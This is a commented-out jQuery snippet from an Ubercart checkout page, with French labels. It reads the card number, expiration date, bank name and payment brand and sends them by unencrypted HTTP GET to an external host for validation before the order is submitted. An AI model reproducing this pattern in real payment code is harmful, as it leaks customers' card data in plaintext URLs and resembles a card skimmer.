/* $(document).ready(function() {
$('form#uc-cart-checkout-review-form input#edit-submit').hide();
 $('form#uc-cart-checkout-review-form input#edit-submit').after('<a id="valide_com">Continuer la commande</a>');
	$('a#valide_com').click(function() {
	
	
	// var message='';
		var bn = $.trim($('#edit-bankName').val());
		var dx = $.trim($('#edit-expirationDate').val());
		var ccn = $.trim($('#edit-ccn').val());
		var pb = $.trim($('#edit-paymentBrandName').val());
		// if(bn.length==0){message +='<br>entre le Nom de Banque';}
		// if(dx.length!=5){var msg="il fait saise 5 caractiere";}
		// if(ccn.length!=5){message +='il fait saise 4 cheffre';}
		
		
		
		// return false;
 
		$.ajax({
			type:"GET",
			url: "http://aljazeera.to.ma/validecartebysite",
			dataType : "json",
			data: "bn=" + encodeURI(bn) + "&dx=" + encodeURI(dx) + "&ccn=" +  encodeURI(ccn) + "&pb=" + encodeURI(pb) + "&cntdx=" + dx.length,
			success: function(data) {
					if(data.error==true){
					// alert(#uc-cart-checkout-review-formdata.error+data.message);
					if($('#uc-cart-checkout-review-form div.error').length != 0){$('#uc-cart-checkout-review-form div.error').html(data.message)}
					else{$('#edit-checksum').after('<div class="error">'+data.message+'</div>');}
						
						 // $('form#uc-cart-checkout-review-form input#edit-submit').show();
							// $('span.ubercart-throbber').remove();
							// $(this)..show();
							// $('#uc-cart-checkout-review-form #edit-back').attr('disabled', false); 
						return false;
					}else{
						$('#uc-cart-checkout-review-form').submit();
					}
			}
 		});
	});
}); */